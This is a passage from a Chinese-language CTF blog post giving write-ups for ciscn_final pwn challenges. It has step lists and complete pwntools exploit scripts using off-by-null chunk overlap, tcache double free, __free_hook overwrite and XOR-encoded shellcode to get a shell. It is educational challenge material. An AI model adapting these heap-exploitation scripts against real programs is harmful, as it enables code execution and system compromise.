class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake the third user as admin</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x4C</span></span><br><span class="line">payload += password</span><br><span class="line">payload += digest</span><br><span class="line">set_content(<span class="number">0x84</span> + <span class="number">0x4C</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login as admin</span></span><br><span class="line">quit()</span><br><span class="line">login(<span class="number">2</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="ciscn-final-8-1"><a href="#ciscn-final-8-1" class="headerlink" title="ciscn_final_8"></a>ciscn_final_8</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>明显的off by null，通过unlink形成chunk overlap，因为看错了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>判断条件一度怀疑人生（甚至怀疑以前怎么做unlink的）。</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ol>
<li>分配所有10个chunk，将后面的7个chunk释放并填满tcache bin。</li>
<li>剩下的三个chunk通过off by null形成chunk overlap，需要满足相应的<code>fd</code>，<code>bk</code>，<code>prev_size</code>字段。</li>
<li>由于”\x00\x02”(<code>prev_size=0x200</code>)无法直接写进去，这里需要连续释放剩下的3个chunk，使得第三个chunk的<code>prev_size</code>会被写入<code>0x200</code>。</li>
<li>将所有10个chunk又全部从bin中分配出来。</li>
<li>释放除了3个上述提到的unsorted bin之外的7个chunk中的6个，以填充6个tcache bin的位置。</li>
<li>将3个unsorted bin中位于中间位置的chunk释放到tcache bin中，从而下一次分配就能分配到该chunk，将size设置为<code>0x78</code>从而覆盖第三个unsorted bin的<code>prev_inuse</code>标志位为0。</li>
<li>再次将tcache bin重新填满，释放第一个unsorted bin，满足<code>fd</code>和<code>bk</code>的约束。</li>
<li>此时再次释放第三个unsorted bin，此时触发unlink，获得0x300的unsorted bin，第二个unsorted bin被overlap，从而可以被二次分配。</li>
<li>之后就利用tcache double free，写<code>__free_hook</code>为onegadget，触发<code>free</code>来getshell。<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size \n&gt; "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content \n&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a38c</span></span><br><span class="line">one_gadget_offset = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">4</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># put chunk 7 into unsorted bin</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"CCCC\n"</span>) <span class="comment"># leave one tacache bin for chunk 8</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># put chunk 8 into tcache bin</span></span><br><span class="line">new(<span class="number">0xF8</span>, <span class="string">"DDDD\n"</span>) <span class="comment"># off by null to chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fill tcache bin</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take all tcache bin out</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"EEEE\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"FFFF\n"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"GGGG\n"</span>) <span class="comment"># chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># prepare enough space</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(__free_hook)) <span class="comment"># chunk 0</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(one_gadget)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="ciscn-final-10"><a href="#ciscn-final-10" class="headerlink" title="ciscn_final_10"></a>ciscn_final_10</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>这个应该巨简单了，根本没难点。</p>
<h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><ol>
<li>首先要通过check才能进行后续操作，随机数肯定是才不到的，后续只要输入一个低2 bytes为0的负数就能通过check了。</li>
<li>后面就是明显的tcache double free。</li>
<li>通过partial write tcache bin，分配到储存<code>The cake is not a lie!</code>的chunk，将其改写为<code>The cake is a lie!</code>。</li>
<li>之后输入一个无效选项（比如3）触发后续接受输入，在对该输入进行简单的异或操作后当作指令执行的功能。</li>
<li>对shellcode进行对应的处理之后作为输入，然后就能getshell了。<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    shellcode = [ord(item) <span class="keyword">for</span> item <span class="keyword">in</span> shellcode][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload += chr(shellcode[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += chr(ord(payload[i - <span class="number">1</span>]) ^ shellcode[i])</span><br><span class="line">    <span class="keyword">return</span> payload[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get access right</span></span><br><span class="line">access()</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># change str</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"\x90"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"The cake is a lie!\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt; "</span>, gen_shellcode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/">https://n0nop.com/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/05/06/kernel-pwn-ROP/"><i class="fa fa-chevron-left">  </i><span>kernel pwn: ROP</span></a></div><div class="next-post pull-right"><a href="/2020/04/21/pwn-fsb-printable/"><span>pwn fsb: printable</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'r5Gkikl9GU9Oux3XiRu5Xtel-MdYXbMMI',
  appKey:'zSDYDqmNTxhb5QxupwDuYOxQ',
  placeholder:'......',
  avatar:'',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://n0nop.com/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>